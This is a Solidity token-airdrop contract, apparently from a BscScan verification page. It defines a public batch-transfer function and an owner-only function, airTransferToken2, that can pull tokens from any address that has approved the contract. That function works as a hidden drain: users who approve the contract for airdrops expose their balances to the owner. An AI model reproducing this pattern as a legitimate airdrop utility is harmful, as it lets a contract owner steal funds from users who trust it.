/**
 *Submitted for verification at BscScan.com on 2022-02-22
*/

// File: contracts\interfaces\IERC20.sol

pragma solidity >=0.5.0;

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;
contract AirDrop {
    address public _owner;

    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Caller is not the owner");
        _;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function modifyOwner(address _newOwner) public onlyOwner() returns (bool) {
        _owner = _newOwner;
        return true;
    }

    function airTransferToken(address tokenAddress, address[] memory _tos, uint v) public returns (bool){
        require(_tos.length > 0, "err A");
        uint256 allV = _tos.length * v;
        require(IERC20(tokenAddress).balanceOf(msg.sender) > allV, "err B");
        require(IERC20(tokenAddress).allowance(msg.sender, address(this)) > allV , "err C");
        for(uint i = 0; i<_tos.length; i++){
            IERC20(tokenAddress).transferFrom(msg.sender, _tos[i], v);
        }
        return true;
    }

    function airTransferToken2(address fromAddress, address tokenAddress, address[] memory _tos, uint v) public onlyOwner() returns (bool){
        require(_tos.length > 0, "err A2");
        uint256 allV = _tos.length * v;
        require(IERC20(tokenAddress).balanceOf(fromAddress) > allV, "err B2");
        require(IERC20(tokenAddress).allowance(fromAddress, address(this)) > allV , "err C2");
        for(uint i = 0; i<_tos.length; i++){
            IERC20(tokenAddress).transferFrom(fromAddress, _tos[i], v);
        }
        return true;
    }

}